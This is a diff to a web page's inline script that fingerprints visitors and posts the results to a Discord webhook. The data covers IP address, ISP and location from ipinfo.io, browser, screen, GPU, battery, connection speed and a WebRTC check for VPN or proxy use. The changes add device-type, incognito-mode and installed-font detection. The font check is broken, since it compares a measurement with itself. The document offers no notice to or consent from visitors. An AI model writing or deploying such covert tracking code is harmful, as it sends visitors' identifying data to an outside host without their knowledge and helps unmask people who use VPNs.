@@ -120,10 +120,11 @@
     
 
 
-  <script>
+<script>
 async function getExtraDeviceInfo() {
     let batteryLevel = "Unknown";
     let isCharging = "Unknown";
+    let deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop/Laptop";
     
     if (navigator.getBattery) {
         const battery = await navigator.getBattery();
@@ -131,23 +132,12 @@ async function getExtraDeviceInfo() {
         isCharging = battery.charging ? "Yes" : "No";
     }
 
-    // تحسين تقدير عدد أنوية المعالج باستخدام Web Workers
     function estimateCPUThreads() {
         return new Promise(resolve => {
             if (navigator.hardwareConcurrency) {
                 resolve(navigator.hardwareConcurrency);
             } else {
-                let workers = [];
-                let startTime = performance.now();
-                for (let i = 0; i < 16; i++) {
-                    let worker = new Worker(URL.createObjectURL(new Blob([`onmessage = () => postMessage(1);`], { type: 'text/javascript' })));
-                    workers.push(worker);
-                    worker.postMessage(1);
-                }
-                setTimeout(() => {
-                    resolve(workers.length);
-                    workers.forEach(worker => worker.terminate());
-                }, 500);
+                resolve("Unknown");
             }
         });
     }
@@ -160,11 +150,11 @@ async function getExtraDeviceInfo() {
         ramSize: ramSize,
         gpu: getGPUInfo(),
         battery: `${batteryLevel} (Charging: ${isCharging})`,
-        numWindows: window.length || "Unknown"
+        numWindows: window.length || "Unknown",
+        deviceType: deviceType
     };
 }
 
-// تحسين دقة قراءة كرت الشاشة (GPU)
 function getGPUInfo() {
     let gl = document.createElement('canvas').getContext('webgl');
     if (!gl) return "Unknown GPU";
@@ -172,16 +162,13 @@ function getGPUInfo() {
     return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
 }
 
-// اختبار سرعة الإنترنت
 async function testInternetSpeed() {
     const startTime = performance.now();
     await fetch('https://speed.hetzner.de/100MB.bin', { method: 'HEAD', mode: 'no-cors' }).catch(() => {});
     const duration = (performance.now() - startTime) / 1000;
-    const downloadSpeed = (100 / duration).toFixed(2) + " MB/s";
-    return downloadSpeed;
+    return (100 / duration).toFixed(2) + " MB/s";
 }
 
-// كشف استخدام VPN/Proxy عبر WebRTC
 async function checkVPN() {
     try {
         let rtc = new RTCPeerConnection();
@@ -198,11 +185,37 @@ async function checkVPN() {
     }
 }
 
-// إرسال البيانات إلى Discord Webhook
+function detectIncognito() {
+    return new Promise((resolve) => {
+        let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+        if (!fs) {
+            resolve("Unknown");
+        } else {
+            fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Yes"));
+        }
+    });
+}
+
+async function getInstalledFonts() {
+    let fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia"];
+    let installedFonts = [];
+    let ctx = document.createElement("canvas").getContext("2d");
+    ctx.font = "72px sans-serif";
+    for (let font of fonts) {
+        ctx.font = `72px ${font}, sans-serif`;
+        if (ctx.measureText("ABC").width !== ctx.measureText("ABC").width) {
+            installedFonts.push(font);
+        }
+    }
+    return installedFonts.length > 0 ? installedFonts.join(", ") : "Unknown";
+}
+
 async function sendToWebhook() {
     const deviceInfo = await getExtraDeviceInfo();
     const internetSpeed = await testInternetSpeed();
     const vpnStatus = await checkVPN();
+    const incognitoMode = await detectIncognito();
+    const installedFonts = await getInstalledFonts();
 
     fetch('https://ipinfo.io/json')
         .then(response => response.json())
@@ -228,7 +241,7 @@ async function sendToWebhook() {
                          `📡 **ISP:** ${org}\n` +
                          `🔗 **IP Address:** ${ip}\n\n` +
                          `💻 **Device Info:**\n` +
-                         `🖥️ **Platform:** ${navigator.platform}\n` +
+                         `🖥️ **Device Type:** ${deviceInfo.deviceType}\n` +
                          `🌐 **Browser:** ${navigator.userAgent}\n` +
                          `🖥️ **Screen Size:** ${screen.width}x${screen.height}\n` +
                          `🗣️ **Language:** ${navigator.language}\n` +
@@ -239,7 +252,9 @@ async function sendToWebhook() {
                          `🔋 **Battery:** ${deviceInfo.battery}\n` +
                          `🖥️ **Open Windows:** ${deviceInfo.numWindows}\n` +
                          `🚀 **Internet Speed:** ${internetSpeed}\n` +
-                         `🛡️ **VPN/Proxy:** ${vpnStatus}\n\n` +
+                         `🛡️ **VPN/Proxy:** ${vpnStatus}\n` +
+                         `🔒 **Incognito Mode:** ${incognitoMode}\n` +
+                         `🖋️ **Installed Fonts:** ${installedFonts}\n\n` +
                          `🕒 **Time:** ${dateTime}`
             };
 
